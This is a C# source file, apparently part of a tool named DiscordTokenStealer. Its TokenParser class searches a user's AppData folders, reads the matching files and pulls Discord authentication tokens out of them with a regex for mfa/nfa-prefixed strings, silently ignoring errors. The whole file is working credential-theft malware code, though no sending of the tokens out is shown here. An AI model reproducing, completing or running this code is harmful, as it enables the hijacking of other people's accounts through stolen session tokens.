using System.Reflection;
using DiscordTokenStealer.Services;
using System.Text.RegularExpressions;
using DiscordTokenStealer.DirectorySearchProviders;

namespace DiscordTokenStealer;

public static class TokenParser
{
    public static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
    public static IEnumerable<string> ParseAll()
    {
        List<string> tokens = new List<string>();
        foreach (AppDataSearchProvider? searchProvider in typeof(AppDataSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public).Where(f => f.FieldType == typeof(AppDataSearchProvider)).Select(f => (AppDataSearchProvider?) f.GetValue(null)))
        {
            if (searchProvider is not { Exists: true })
            {
                continue;
            }
            tokens.AddRange(ParseFrom(searchProvider));
        }
        return tokens.Distinct();
    }

    public static IEnumerable<string> ParseFrom(IDirectorySearchProvider searchProvider)
    {
        if (!searchProvider.Exists)
        {
            return Enumerable.Empty<string>();
        }
        return Directory.EnumerateFiles(searchProvider.Directory, searchProvider.Pattern).SelectMany(fileName =>
        {
            try
            {
                return ParseTokens(File.ReadAllText(fileName));
            }
            catch 
            { 
                return Enumerable.Empty<string>();
            }
        });
    }

    public static IEnumerable<string> ParseTokens(string str)
    {
        return TokenRegex.Matches(str).Where(m => m.Success).Select(match => match.Groups[1].Value);
    }
}